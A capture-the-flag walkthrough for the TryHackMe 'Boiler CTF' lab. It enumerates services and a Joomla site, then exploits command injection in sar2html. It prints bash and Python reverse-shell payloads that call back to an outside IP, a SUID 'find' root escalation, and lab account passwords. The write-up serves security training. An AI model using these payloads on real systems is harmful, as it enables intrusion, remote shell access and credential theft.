# Tryhackme.com Room : Boiler CTF
`https://tryhackme.com/room/boilerctf2`


# Instance
```
export IP=10.10.5.8
```

# Nmap
```
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.110.115
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```

From the questions, we find that there might be more ports so let's run `nmap -p- -Pn $IP`
```
21/tcp    open  ftp
80/tcp    open  http
10000/tcp open  snet-sensor-mgmt
55007/tcp open  unknown
```

Let's analyse further port 55007 `nmap -sC -sV -A -p 55007 $IP`
```
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519
```

Let's take a look at `ftp://$IP`
Looks empty, couldn't find anything.
Actually, was empty when browsing from the web browser but using the command line we see a hidden file `.info.txt`
```
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

Look like Caesar cipher. It's ROT13 :
```
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

Let's look at service on port `10000`. We find a `webmin` instance.
Only accessible via https.

Was about to enumerate but there is a question that ask `Is this service exploitable` And the answer is no... So i guess it isnt. Even tho we found a bunch of exploits for webmin

Let's look at web server on port `80`.

`robots.txt` contains :
```
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```

We can convert the digits to text (Using ASCII TABLE).
```
OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK
```

We base64 decode
```
99b0660cd95adea327c54182baa51584
```

Looks like a md5 hash, we find
```
kidding
```

Seems like another dead end.

Can't resolve any entry of the robots.txt

Let's gobuster `gobuster dir -w /usr/share/wordlists/dirb/common.txt --url http://$IP`
```
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/joomla (Status: 301)
/manual (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
```

`/manual` show the Apache HTTP Server Version 2.4 documentation.

We find a joomla instance at `/joomla`

Let's gobuster joomla `gobuster dir -w /usr/share/wordlists/dirb/common.txt --url http://$IP/joomla`

We find
```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.hta (Status: 403)
/_archive (Status: 301)
/_database (Status: 301)
/_files (Status: 301)
/_test (Status: 301)
/~www (Status: 301)
/administrator (Status: 301)
/bin (Status: 301)
/build (Status: 301)
/cache (Status: 301)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/installation (Status: 301)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/templates (Status: 301)
/tests (Status: 301)
/tmp (Status: 301)
/index.php (Status: 200)
```

Empty pages :
```
/joomla/bin
/joomla/tmp
/joomla/cache
/joomla/components
/joomla/images
/joomla/includes
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/templates (Status: 301)
```

We find in `/joomla/_database`
```
Lwuv oguukpi ctqwpf.
```
Dead end again, ROT2 :
```
Just messing around.
```

In `/joomla/_archive` :
```
Mnope, nothin to see.
```

Then `/joomla/_files` give use base64 string `echo VjJodmNITnBaU0JrWVdsemVRbz0K | base64 -d | base64 -d`:
```
Whopsie daisy
```

In `/joomla/~www` :
```
Mnope, nothin to see.
```

In `/joomla/_test` run `sar2html`. might be able to exploit this ?

In `/joomla/build` :
```
[DIR]	bootstrap/	2019-08-22 11:45 	- 	 
build.php	2019-08-22 11:45 	13K	 
bump.php	2019-08-22 11:45 	12K	 
deleted_file_check.php	2019-08-22 11:45 	3.2K	 
generatecss.php	2019-08-22 11:45 	2.6K	 
helpTOC.php	2019-08-22 11:45 	5.3K	 
indexmaker.php	2019-08-22 11:45 	1.0K	 
[DIR]	jenkins/	2019-08-22 11:45 	- 	 
[DIR]	less/	2019-08-22 11:45 	- 	 
[DIR]	phpcs/	2019-08-22 11:45 	- 	 
phpmd.xml	2019-08-22 11:45 	603 	 
stubGenerator.php	2019-08-22 11:45 	3.2K	 
[DIR]	travis/	2019-08-22 11:45 	-
```
Might be some CI/CD on there ?

`/joomla/administrator` is the admin login page.

We got access to the Jooomla Installation folder `/joomla/installation`. Probably some way to abuse this.

`/joomla/tests` Joomla test suite

We can determine joomla version by browsing `/joomla/administrator/manifests/files/joomla.xml`
```
Joomla version 3.6
```

Found this exploit `Joomla! < 3.6.4 - Admin Takeover exploits/php/webapps/41157.py` but doesn't seem to work since the user registration is disabled.

Found another exploit `Joomla! 3.4.4 < 3.6.4 - Account Creation / Privilege Escalation exploits/php/webapps/40637.txt` but same problem. Account creation deactivated/no activation email sent.

Let's try `cms-explorer`
```
./cms-explorer.pl --url http://$IP/joomla -type joomla
*****************************************************************
WARNING: No osvdb.org API key defined, searches will be disabled.
*****************************************************************

*******************************************************
Beginning run against http://10.10.121.51/joomla/...
Testing themes from joomla_themes.txt...
Theme Installed:                templates/system/
Testing plugins...
Plugin Installed:               components/com_banners/
Plugin Installed:               components/com_contact/
Plugin Installed:               components/com_content/
Plugin Installed:               components/com_mailto/
Plugin Installed:               components/com_media/
Plugin Installed:               components/com_newsfeeds/
Plugin Installed:               components/com_search/
Plugin Installed:               components/com_users/
Plugin Installed:               components/com_wrapper/
Plugin Installed:               modules/mod_articles_archive/
Plugin Installed:               modules/mod_articles_category/
Plugin Installed:               modules/mod_articles_latest/
Plugin Installed:               modules/mod_articles_news/
Plugin Installed:               modules/mod_articles_popular/
Plugin Installed:               modules/mod_banners/
Plugin Installed:               modules/mod_breadcrumbs/
Plugin Installed:               modules/mod_custom/
Plugin Installed:               modules/mod_feed/
Plugin Installed:               modules/mod_footer/
Plugin Installed:               modules/mod_login/
Plugin Installed:               modules/mod_menu/
Plugin Installed:               modules/mod_random_image/
Plugin Installed:               modules/mod_related_items/
Plugin Installed:               modules/mod_search/
Plugin Installed:               modules/mod_stats/
Plugin Installed:               modules/mod_syndicate/
Plugin Installed:               modules/mod_users_latest/
Plugin Installed:               modules/mod_whosonline/
Plugin Installed:               modules/mod_wrapper/

*******************************************************
Summary:
Theme Installed:                templates/system/
        URL                     http://10.10.121.51/joomla/templates/system/
Plugin Installed:               components/com_banners/
        URL                     http://10.10.121.51/joomla/components/com_banners/
        URL                     http://10.10.121.51/joomla/index.php?option=com_banners
Plugin Installed:               components/com_contact/
        URL                     http://10.10.121.51/joomla/components/com_contact/
        URL                     http://10.10.121.51/joomla/index.php?option=com_contact
Plugin Installed:               components/com_content/
        URL                     http://10.10.121.51/joomla/components/com_content/
        URL                     http://10.10.121.51/joomla/index.php?option=com_content
Plugin Installed:               components/com_mailto/
        URL                     http://10.10.121.51/joomla/components/com_mailto/
        URL                     http://10.10.121.51/joomla/index.php?option=com_mailto
Plugin Installed:               components/com_media/
        URL                     http://10.10.121.51/joomla/components/com_media/
        URL                     http://10.10.121.51/joomla/index.php?option=com_media
Plugin Installed:               components/com_newsfeeds/
        URL                     http://10.10.121.51/joomla/components/com_newsfeeds/
        URL                     http://10.10.121.51/joomla/index.php?option=com_newsfeeds
Plugin Installed:               components/com_search/
        URL                     http://10.10.121.51/joomla/components/com_search/
        URL                     http://10.10.121.51/joomla/index.php?option=com_search
Plugin Installed:               components/com_users/
        URL                     http://10.10.121.51/joomla/components/com_users/
        URL                     http://10.10.121.51/joomla/index.php?option=com_users
Plugin Installed:               components/com_wrapper/
        URL                     http://10.10.121.51/joomla/components/com_wrapper/
        URL                     http://10.10.121.51/joomla/index.php?option=com_wrapper
Plugin Installed:               modules/mod_articles_archive/
        URL                     http://10.10.121.51/joomla/modules/mod_articles_archive/
Plugin Installed:               modules/mod_articles_category/
        URL                     http://10.10.121.51/joomla/modules/mod_articles_category/
Plugin Installed:               modules/mod_articles_latest/
        URL                     http://10.10.121.51/joomla/modules/mod_articles_latest/
Plugin Installed:               modules/mod_articles_news/
        URL                     http://10.10.121.51/joomla/modules/mod_articles_news/
Plugin Installed:               modules/mod_articles_popular/
        URL                     http://10.10.121.51/joomla/modules/mod_articles_popular/
Plugin Installed:               modules/mod_banners/
        URL                     http://10.10.121.51/joomla/modules/mod_banners/
Plugin Installed:               modules/mod_breadcrumbs/
        URL                     http://10.10.121.51/joomla/modules/mod_breadcrumbs/
Plugin Installed:               modules/mod_custom/
        URL                     http://10.10.121.51/joomla/modules/mod_custom/
Plugin Installed:               modules/mod_feed/
        URL                     http://10.10.121.51/joomla/modules/mod_feed/
Plugin Installed:               modules/mod_footer/
        URL                     http://10.10.121.51/joomla/modules/mod_footer/
Plugin Installed:               modules/mod_login/
        URL                     http://10.10.121.51/joomla/modules/mod_login/
Plugin Installed:               modules/mod_menu/
        URL                     http://10.10.121.51/joomla/modules/mod_menu/
Plugin Installed:               modules/mod_random_image/
        URL                     http://10.10.121.51/joomla/modules/mod_random_image/
Plugin Installed:               modules/mod_related_items/
        URL                     http://10.10.121.51/joomla/modules/mod_related_items/
Plugin Installed:               modules/mod_search/
        URL                     http://10.10.121.51/joomla/modules/mod_search/
Plugin Installed:               modules/mod_stats/
        URL                     http://10.10.121.51/joomla/modules/mod_stats/
Plugin Installed:               modules/mod_syndicate/
        URL                     http://10.10.121.51/joomla/modules/mod_syndicate/
Plugin Installed:               modules/mod_users_latest/
        URL                     http://10.10.121.51/joomla/modules/mod_users_latest/
Plugin Installed:               modules/mod_whosonline/
        URL                     http://10.10.121.51/joomla/modules/mod_whosonline/
Plugin Installed:               modules/mod_wrapper/
        URL                     http://10.10.121.51/joomla/modules/mod_wrapper/
```

We run `joomscan` :
```
Vulnerabilities Discovered                      
# 1
                                                                                                            
Info -> Generic: htaccess.txt has not been renamed.
                                                            
Versions Affected: Any
                                                                                         
Check: /htaccess.txt
                                                                                           
Exploit: Generic defenses implemented in .htaccess are not available, so exploiting is more likely to succeed.
 
Vulnerable? Yes                                                                                                 
# 2
                                                                                                            
Info -> Generic: Unprotected Administrator directory
                                                           
Versions Affected: Any

Check: /administrator/

Exploit: The default /administrator directory is detected. Attackers can bruteforce administrator accounts. Read: http://yehg.net/lab/pr0js/view.php/MULTIPLE%20TRICKY%20WAYS%20TO%20PROTECT.pdf                                               
Vulnerable? Yes                                                         
```

They keep referencing enumeration.. Let's gobuster some more

`gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://$IP/tmp -x php,txt,js,html,jpg`

We can execute commands exploiting sar2html :
```
joomla/_test/index.php?plot=;ls -la
```

The output is in the `Select Host` dropdown menu.

We find 2 users
```
bastard
stoner
```

Let's get a reverse shell
Tried this :
```
http://10.10.5.8/joomla/_test/index.php?plot=;bash -i >& /dev/tcp/10.10.189.189/4444 0>&1
```

But the command got split at & (url parameter delimiter). I encoded it with `%26` but it didn't like the character `>` neither its encoded form.

I used a python reverse shell instead:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.189.189",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

And we got a shell.
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We run linpeas
```
Linux version 4.4.0-142-generic
```

`find` as suid. Looking at gtfobins we find :
```
find . -exec /bin/sh -p \; -quit  
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

Here we go, we're root.

We find the first flag `cat /home/stoner/.secret`:
```
You made it till here, well done.
```

In `/home/basterd` there is a `backup.sh` file that copy files over ssh (Prob runned via cron job). Probably could have escalated that way.
We also find some credentials :
```
stoner:superduperp@$$no1knows
```

Which we could have used to get the first flag (that we got as `root` escalated from `www-data`)

I'm guessing that the credentials for basterd are somewhere on the webserver

Root flag `cat /root/root.txt` :
```
It wasn't that hard, was it?
```

We could find the credentials for `basterd` in `/joomla/_test/log.txt`
```
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
```

```
basterd:superduperp@$$
```